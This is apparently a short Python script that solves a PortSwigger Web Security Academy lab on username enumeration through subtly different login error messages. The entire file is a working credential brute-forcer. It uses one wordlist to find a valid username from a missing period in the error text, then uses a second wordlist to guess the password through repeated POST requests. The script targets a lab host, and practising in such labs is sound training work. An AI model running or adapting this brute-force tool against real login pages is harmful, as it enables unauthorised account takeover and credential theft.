# A simple python program made to solve the following PortSwigger Lab:
# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "INSERT SUB-DOMAIN HERE" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
WRONG_USERNAME_MESSAGE = "Invalid username or password."
WRONG_PASSWORD_MESSAGE = "Invalid username or password" # Notice the lack of the "." character at the end.
USERNAME_FILE = "./username-wordlist.txt"
PASSWORD_FILE = "./password-wordlist.txt"

def informUserOfConfiguration():
    print(f"Program Starting...")
    print(f"Target URL: {FULL_PATH}")
    print(f"Expected Message For Wrong Username: {WRONG_USERNAME_MESSAGE}")
    print(f"Expected Message For Wrong Password: {WRONG_PASSWORD_MESSAGE}")
    print(f"Usernames Loaded From: {USERNAME_FILE}")
    print(f"Passwords Loaded From: {PASSWORD_FILE}")
    return 0

def appendFileLinesToArray(file_name):
    array = []
    with open(file_name, 'r') as file:
        for line in file:
            array.append(line.strip())
    return array

def findUsername():
    usernames = appendFileLinesToArray(USERNAME_FILE)
    for username in usernames:
        data = {
            'username': username,
            'password': "wrongpassword"
        }
        print(f"Looking For Username: {username}")
        response = requests.post(FULL_PATH, data = data)
        if not WRONG_USERNAME_MESSAGE in response.text:
            print(f"Potential Username Found: {username}")
            return username

def findPassword():
    passwords = appendFileLinesToArray(PASSWORD_FILE)
    username = findUsername()
    for password in passwords:
        data = {
            'username': username,
            'password': password
        }
        print(f"Looking For Password: {password}")
        response = requests.post(FULL_PATH, data = data)
        if not WRONG_PASSWORD_MESSAGE in response.text:
            print(f"Potential Password Found: {password}")
            return [username, password]

informUserOfConfiguration()

credentials = findPassword()

print(f"Program has ended, potential credentials: {credentials[0]}:{credentials[1]}")